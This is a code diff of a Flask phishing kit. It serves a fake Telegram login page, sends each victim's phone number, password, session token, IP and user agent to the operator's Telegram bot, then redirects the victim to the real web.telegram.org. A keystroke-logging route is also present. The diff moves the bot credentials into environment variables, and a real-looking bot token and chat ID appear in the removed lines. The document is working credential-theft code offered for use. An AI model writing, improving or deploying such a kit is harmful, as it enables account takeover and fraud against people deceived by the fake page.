@@ -1,23 +1,25 @@
 from flask import Flask, request, render_template_string, redirect
 import requests
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 
 # ===== CONFIG =====
-BOT_TOKEN = "8161884377:AAH7zILNRGrqH-12JtobVpsxslIXIQoMipM"  # Get from @BotFather
-CHAT_ID = "6181804501"      # Get from @userinfobot
+BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+CHAT_ID = os.environ.get('CHAT_ID', 'YOUR_CHAT_ID_HERE')
 # =================
 
-# Your HTML page (same as final version)
-HTML_PAGE = """<!DOCTYPE html>
-HTML_PAGE = """<!DOCTYPE html>
+# ===== CLEAN HTML — NO BROKEN FAVICON =====
+HTML_PAGE = """
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z' fill='%230088cc'/%3E%3Cpath d='M5.491 11.74l11.57-4.461c.537-.194 1.006.131.832.943l.001-.001-1.97 9.281c-.146.658-.537.818-1.084.508l-3.013-2.222-1.467 1.412c-.162.162-.297.297-.605.297l.216-3.073 5.593-5.055c.243-.216-.054-.338-.377-.121l-6.914 4.354-2.982-.934c-.648-.203-.66-.648.135-.962z' fill='%23ffffff'/%3E%3C/svg%3E" type="image/svg+xml">
+    <!-- Simple favicon - inline SVG -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='12' fill='%230088cc'/><path d='M5.5 11.7l11.6-4.5c.5-.2 1 .1.8.9l-2 9.3c-.1.7-.5.8-1.1.5l-3-2.2-1.5 1.4c-.2.2-.3.3-.6.3l.2-3.1 5.6-5c.2-.2-.1-.3-.4-.1l-6.9 4.4-3-.9c-.6-.2-.7-.6.1-1z' fill='white'/></svg>" type="image/svg+xml">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -134,7 +136,6 @@ HTML_PAGE = """<!DOCTYPE html>
             color: #555555;
         }
 
-        /* ===== SIMPLE PASSWORD FIX ===== */
         .password-wrapper {
             display: flex;
             align-items: center;
@@ -150,8 +151,8 @@ HTML_PAGE = """<!DOCTYPE html>
             background: #2a2a2a;
         }
 
-        /* THE FIX: Force password dots on all devices */
-        .password-wrapper input[type="password"] {
+        .password-wrapper input[type="password"],
+        .password-wrapper input[type="text"] {
             flex: 1;
             min-width: 80px;
             border: none;
@@ -162,13 +163,17 @@ HTML_PAGE = """<!DOCTYPE html>
             outline: none;
             -webkit-text-fill-color: #ffffff !important;
             opacity: 1 !important;
-            /* This forces dots on iOS/Android */
             -webkit-text-security: disc !important;
             text-security: disc !important;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
-        .password-wrapper input[type="password"]::placeholder {
+        .password-wrapper input[type="text"] {
+            -webkit-text-security: none !important;
+            text-security: none !important;
+        }
+
+        .password-wrapper input::placeholder {
             color: #555555 !important;
             -webkit-text-fill-color: #555555 !important;
             opacity: 1 !important;
@@ -176,19 +181,17 @@ HTML_PAGE = """<!DOCTYPE html>
             text-security: none !important;
         }
 
-        /* Kill browser eye */
-        .password-wrapper input[type="password"]::-webkit-reveal {
-            display: none !important;
-        }
-        .password-wrapper input[type="password"]::-ms-reveal {
-            display: none !important;
-        }
-
-        /* Autofill override */
-        .password-wrapper input[type="password"]:-webkit-autofill {
+        .password-wrapper input:-webkit-autofill {
             -webkit-box-shadow: 0 0 0 1000px #262626 inset !important;
             -webkit-text-fill-color: #ffffff !important;
             -webkit-text-security: disc !important;
+        }
+
+        .password-wrapper input::-webkit-reveal {
+            display: none !important;
+        }
+        .password-wrapper input::-ms-reveal {
+            display: none !important;
         }
 
         .password-toggle {
@@ -392,7 +395,8 @@ HTML_PAGE = """<!DOCTYPE html>
                 font-size: 15px;
                 min-width: 80px;
             }
-            .password-wrapper input[type="password"] {
+            .password-wrapper input[type="password"],
+            .password-wrapper input[type="text"] {
                 padding: 12px 10px 12px 14px;
                 font-size: 15px;
             }
@@ -419,7 +423,8 @@ HTML_PAGE = """<!DOCTYPE html>
                 padding: 16px 18px 16px 6px;
                 font-size: 17px;
             }
-            .password-wrapper input[type="password"] {
+            .password-wrapper input[type="password"],
+            .password-wrapper input[type="text"] {
                 padding: 16px 14px 16px 18px;
                 font-size: 17px;
             }
@@ -504,14 +509,11 @@ HTML_PAGE = """<!DOCTYPE html>
         </div>
     </div>
     <script>
-        // ====== EYE TOGGLE ======
         (function() {
             const toggle = document.getElementById('togglePassword');
             const field = document.getElementById('password');
             let visible = false;
-
             toggle.classList.add('hidden');
-
             toggle.addEventListener('click', function(e) {
                 e.preventDefault();
                 visible = !visible;
@@ -519,7 +521,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 field.type = visible ? 'text' : 'password';
                 field.focus();
             });
-
             field.addEventListener('input', function() {
                 if (this.value.length === 0 && visible) {
                     visible = false;
@@ -528,8 +529,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 }
             });
         })();
-
-        // ====== FORM SUBMIT ======
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             if (document.getElementById('website').value.length > 0) {
                 e.preventDefault();
@@ -542,13 +541,13 @@ HTML_PAGE = """<!DOCTYPE html>
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         });
-
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
         });
     </script>
 </body>
-</html>"""
+</html>
+"""
 
 @app.route('/')
 def index():
@@ -564,12 +563,10 @@ def login():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
 
-    # Build full phone number
     full_phone = f"{country}{phone}" if phone else phone
 
-    # Send to Telegram
     message = f"""🔐 **NEW LOGIN CREDENTIALS**
-    
+
 📱 **Phone:** `{full_phone}`
 🔑 **Password:** `{password}`
 🎫 **Session:** `{session_token}`
@@ -589,7 +586,6 @@ def login():
     except Exception as e:
         print(f"Telegram send failed: {e}")
 
-    # Redirect to real Telegram
     return redirect('https://web.telegram.org')
 
 @app.route('/keystroke', methods=['POST'])
